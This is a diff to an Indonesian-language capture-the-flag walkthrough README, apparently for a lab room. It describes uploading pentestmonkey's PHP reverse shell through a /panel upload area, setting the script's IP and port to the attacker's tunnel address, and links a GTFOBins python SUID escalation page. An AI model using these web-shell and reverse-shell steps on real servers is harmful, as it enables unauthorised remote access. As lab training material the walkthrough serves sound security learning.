@@ -4,7 +4,7 @@
 
 # docs
 - [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
-- [https://gtfobins.github.io/](https://gtfobins.github.io/)
+- [https://gtfobins.github.io/gtfobins/python/#suid](https://gtfobins.github.io/gtfobins/python/#suid)
 
 # answer
 - Task 1
@@ -37,16 +37,16 @@ Langkah berikutnya adalah mencari direktori atau file yang tersembunyi pada serv
     ![alt text](docs/images/image-2.png)
     ![alt text](docs/images/image-3.png)
   - **Explore the /panel Directory**
-Direktori /panel mungkin adalah panel admin atau area untuk melakukan upload file
+Direktori **/panel** mungkin adalah panel admin atau area untuk melakukan upload file
 
 ## exploit
 - **Web Shell Upload**
 Web shell upload adalah tindakan meng-upload file berbahaya (umumnya skrip PHP, ASP, atau lainnya) yang dapat dieksekusi di server untuk mendapatkan akses dan kontrol
   - **download the file** [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell)
-  - **Check IP Tunnel**: Untuk mengetahui IP tunnel yang kamu miliki, misalnya 10.21.78.122, kamu bisa menggunakan perintah ip a atau ip addr show tun0 di server. IP ini adalah alamat dari interface yang kamu gunakan untuk tunneling. 
+  - **Check IP Tunnel**: Untuk mengetahui IP tunnel yang kamu miliki, misalnya **10.21.78.122**, kamu bisa menggunakan perintah **ip a** atau **ip addr show tun0** di server. IP ini adalah alamat dari interface yang kamu gunakan untuk tunneling. 
     ![alt text](docs/images/image-4.png)
   - **Edit File PHP**: Buka file php-reverse-shell.php yang telah diunduh di editor teks atau IDE favoritmu. \
-  Ubah IP dan Port: Temukan bagian berikut dalam skrip tersebut:
+  **Ubah IP dan Port**: Temukan bagian berikut dalam skrip tersebut:
     ```bash
     $ip = '10.21.78.122';  // IP Dari Interface yang kamu miliki (tun0)
     $port = 9001;       // Port yang ingin kamu Listen
